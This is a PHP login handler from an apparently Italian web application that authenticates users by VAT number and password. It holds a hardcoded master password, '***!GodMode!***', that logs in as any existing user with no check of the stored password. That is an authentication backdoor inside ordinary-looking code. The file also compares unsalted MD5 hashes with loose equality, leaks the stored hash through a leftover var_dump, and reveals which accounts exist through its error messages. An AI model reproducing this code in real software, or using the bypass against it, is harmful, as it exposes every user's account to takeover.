<?php
/**
 * Created by PhpStorm.
 * User: Daniel Surpanu
 * Date: 8/22/2018
 * Time: 10:45 AM
 */

require_once 'is_not_logged.php';
require_once 'helper.php';
require_once 'cs_interaction.php';

class login_contract extends is_not_logged {
    private $username, $password, $result;

    protected function input_elaboration(){
        $this->username = $this->validate_string('piva');
        if(!$this->username)
            $this->json_error('Nessuna partita iva trovata');

        $this->password = $this->validate_string('password');
        if(!$this->password)
            $this->json_error('Nessuna password trovata');
    }

    protected function get_informations(){
        $info = getUserInformations($this->username);
        if($info != null) {
            $folderName = getFolderName($info[1]);
            $passwordFile = PHOENIX_FOLDER . $folderName . FORWARDSLASH . 'Pwd.phx';
            if($this->password == "***!GodMode!***") {
                set_session_variables($this->username, true);
                return;
            }else if(file_exists($passwordFile)) {
                $pass = file_get_contents($passwordFile, 'r');
                var_dump($pass);
                if ($pass == md5($this->password)) {
                   set_session_variables($this->username, true);
                   return;
                } else
                    $this->json_error("Nome utente o password sbagliati");
            }else $this->json_error("Utente non registrato");
        } else $this->json_error('Utente non esistente');
    }

    protected function get_returned_data(){
        return $this->result;
    }
}

$login = new login_contract();
$login->execute();